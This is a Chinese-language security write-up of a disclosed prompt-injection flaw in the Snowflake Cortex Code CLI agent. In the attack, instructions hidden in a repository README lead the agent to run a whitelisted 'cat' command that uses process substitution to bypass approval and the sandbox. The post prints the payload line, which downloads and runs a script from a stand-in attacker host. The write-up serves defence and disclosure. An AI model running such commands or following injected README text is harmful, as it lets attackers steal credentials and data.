## 是什么 / 解决什么问题

Snowflake Cortex Code CLI 是 Snowflake 于 2026 年 2 月 2 日推出的命令行 AI 编程助手，定位与 Claude Code、OpenAI Codex 类似，但额外内置了直接执行 Snowflake SQL 查询的能力。用户可以在终端中用自然语言让 AI 帮助探索代码库、编写代码、查询数据库。

2026 年 2 月 5 日（发布后仅 3 天），安全公司 PromptArmor 发现了一个严重的命令验证漏洞：攻击者可以通过**间接 prompt injection**（隐藏在 GitHub 仓库 README 文件底部）诱使 Cortex 执行恶意命令，绕过人机验证（human-in-the-loop approval），甚至突破沙箱限制执行任意代码。

漏洞的核心在于：Cortex 将 `cat` 命令列为"无需用户批准即可执行"的安全命令，但未对命令内部的**进程替换**（process substitution）语法进行验证。攻击者构造如下命令：

```bash
cat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot))
```

表面看是 `cat` 命令（被白名单允许），但 `< <(...)` 语法会在执行 `cat` 之前先运行括号内的任意 shell 命令。这导致攻击者可以：
1. 下载并执行远程恶意脚本
2. 窃取 Cortex 缓存的 Snowflake 认证凭证
3. 以受害者权限执行任意 SQL 操作（导出数据、删除表、添加后门用户）

Snowflake 于 2 月 28 日发布 v1.0.25 修复此漏洞，3 月 16 日与 PromptArmor 联合公开披露。

## 技术架构拆解

### 核心设计决策

| 决策 | 描述 | 问题 |
|------|------|------|
| 命令白名单验证 | 将部分命令（如 `cat`）标记为"安全"，无需用户批准 | 未验证命令参数/子进程内容，导致绕过 |
| 沙箱模式（OS+Regular） | 限制网络访问和文件系统范围 | 进程替换可在沙箱外执行命令 |
| 凭证缓存 | 使用浏览器认证后缓存 token 供 CLI 使用 | 被攻击脚本读取后获得完整数据库访问权限 |
| 子代理（subagent）架构 | Cortex 可调用子代理探索仓库 | 子代理间上下文传递丢失，导致主代理不知命令已执行 |
| 无工作区信任（workspace trust） | 未实现类似 VS Code 的"新目录风险警告" | 用户无感知进入未信任仓库 |

## 实用评估

### 什么场景值得用

- **受控内部项目**：处理公司内部仓库、已知安全的代码库时，Cortex 的 Snowflake 集成可显著提升 SQL 开发效率
- **学习/探索场景**：在隔离环境中学习 Snowflake SQL、探索数据结构
- **已确认修复版本**：确保使用 v1.0.25+ 且开启自动更新

### 什么场景不值得用

- **第三方开源仓库**：任何未审计的 GitHub 仓库都可能隐藏 prompt injection（本攻击即通过 README 注入）
- **高安全要求环境**：处理敏感数据、生产数据库凭证时，建议禁用 AI 助手的自动命令执行
- **多子代理复杂任务**：子代理上下文丢失问题可能导致用户误判命令执行状态（修复状态待确认）

### 迁移成本

- **从 Claude Code / Codex 迁移到 Cortex**：几乎零成本（CLI 使用方式类似），但需评估 Snowflake 集成的必要性
- **从 Cortex 迁移回传统工具**：零成本（无锁定），但失去 AI 辅助 SQL 编写能力
- **安全加固成本**：若继续使用 Cortex，建议：
  - 强制 v1.0.25+ 版本
  - 禁用自动凭证缓存（改用每次手动认证）
  - 在沙箱外运行（牺牲安全性换取可预测性）
  - 审计所有第三方仓库后再用 Cortex 打开

## 对你的意义

如果你正在构建或评估 Agent 系统，这个案例是**教科书级的间接 prompt injection 攻击链**：

1. **白名单验证的陷阱**：很多 Agent 工具（包括本案例）用命令白名单替代语义理解，但参数/子进程验证是常见盲区
2. **沙箱边界模糊**：进程替换、管道、子 shell 等 shell 特性可在"安全命令"内部执行任意代码
3. **子代理上下文丢失**：多 Agent 系统中，跨级通信的完整性验证至关重要
4. **凭证管理是命门**：AI 助手缓存的认证凭证一旦被窃取，攻击者获得的是**完整用户权限**

**建议**：
- 若你正在开发 Agent CLI：**不要用白名单替代语义验证**，考虑在沙箱外做确定性拦截（如 Simon Willison 建议）
- 若你正在使用 Cortex：**立即升级到 v1.0.25+**，避免处理未审计的第三方仓库
- 若你在评估 Agent 安全：将此案例加入测试用例库，验证你的系统是否能抵御同类攻击
